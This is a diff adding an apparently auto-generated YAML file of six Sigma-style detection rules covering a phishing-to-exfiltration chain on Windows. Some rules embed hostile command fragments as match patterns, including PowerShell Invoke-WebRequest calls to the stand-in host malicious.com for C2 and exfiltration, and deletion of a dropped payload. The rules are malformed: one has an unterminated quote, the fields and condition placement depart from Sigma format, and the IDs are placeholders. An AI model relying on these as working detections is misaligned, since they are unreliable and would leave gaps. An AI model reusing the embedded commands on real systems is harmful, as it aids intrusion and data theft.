@@ -1,0 +1,142 @@
+```yaml
+- title: Identify Initial Access via Spearphishing Email
+  id: 123e4567-e89b-12d3-a456-426614174000
+  description: Detects when a user opens a malicious attachment in Outlook.
+  status: production
+  author: auto-generated
+  date: 2023-10-01
+  logsource:
+    category: custom
+    product: windows
+  detection:
+    selection:
+      srcNode:
+        Image: Outlook
+      Cmdline: '*Start-Process "C:\\Users\\Victim\\Downloads\\invoice.docx"* 
+      relation: Process Create
+  condition: selection
+  tags:
+    - T1566
+    - Initial Access
+  level: high
+---
+- title: Capture Exploit Execution
+  id: 123e4567-e89b-12d3-a456-426614174001
+  description: Detects when a user opens a malicious Word document that executes a macro.
+  status: production
+  author: auto-generated
+  date: 2023-10-01
+  logsource:
+    category: custom
+    product: windows
+  detection:
+    selection:
+      srcNode:
+        Image: WINWORD.EXE
+      Cmdline: '*Executing macro*'
+      dstNode: 
+        Image: 'C:\\Users\\Victim\\AppData\\Local\\Temp\\payload.exe'
+      relation: Process Create
+  condition: selection
+  tags:
+    - T1203
+    - Execution
+  level: high
+---
+- title: Detect Payload Execution
+  id: 123e4567-e89b-12d3-a456-426614174002
+  description: Monitors for the execution of a payload via PowerShell.
+  status: production
+  author: auto-generated
+  date: 2023-10-01
+  logsource:
+    category: custom
+    product: windows
+  detection:
+    selection:
+      srcNode:
+        Image: powershell.exe
+      Cmdline: '*Start-Process "C:\\Users\\Victim\\AppData\\Local\\Temp\\payload.exe"*'
+      dstNode: 
+        Image: 'C:\\Users\\Victim\\AppData\\Local\\Temp\\payload.exe'
+      relation: Process Create
+  condition: selection
+  tags:
+    - T1059
+    - Execution
+  level: high
+---
+- title: Monitor Command and Control Communication
+  id: 123e4567-e89b-12d3-a456-426614174003
+  description: Identifies network communication initiated by the payload to a C2 server.
+  status: production
+  author: auto-generated
+  date: 2023-10-01
+  logsource:
+    category: custom
+    product: windows
+  detection:
+    selection:
+      srcNode:
+        Image: powershell.exe
+      Cmdline: '*Invoke-WebRequest -Uri "http://malicious.com/c2"*'
+      dstNode:
+        Dstaddress: malicious.com
+        Port: 
+          - 80
+          - 443
+      relation: TCP Connect
+  condition: selection
+  tags:
+    - T1071
+    - Command and Control
+  level: high
+---
+- title: Track Data Exfiltration
+  id: 123e4567-e89b-12d3-a456-426614174004
+  description: Captures events related to the exfiltration of sensitive data.
+  status: production
+  author: auto-generated
+  date: 2023-10-01
+  logsource:
+    category: custom
+    product: windows
+  detection:
+    selection:
+      srcNode:
+        Image: powershell.exe
+      Cmdline: '*Invoke-WebRequest -Uri "http://malicious.com/exfil"*'
+      dstNode:
+        Dstaddress: malicious.com
+      relation: TCP Connect
+  condition: selection
+  tags:
+    - T1041
+    - Exfiltration
+  level: high
+---
+- title: Detect Cleanup and Persistence Actions
+  id: 123e4567-e89b-12d3-a456-426614174005
+  description: Monitors for actions taken to delete the payload or create persistence mechanisms.
+  status: production
+  author: auto-generated
+  date: 2023-10-01
+  logsource:
+    category: custom
+    product: windows
+  detection:
+    selection:
+      srcNode:
+        Image: powershell.exe
+      Cmdline: '*Remove-Item "C:\\Users\\Victim\\AppData\\Local\\Temp\\payload.exe"*'
+      dstNode: 
+        Image: 'C:\\Users\\Victim\\AppData\\Local\\Temp\\payload.exe'
+      relation: 
+        - File: CloseFile
+        - File: DeleteFile
+  condition: selection
+  tags:
+    - T1070
+    - Defense Evasion
+  level: medium
+```
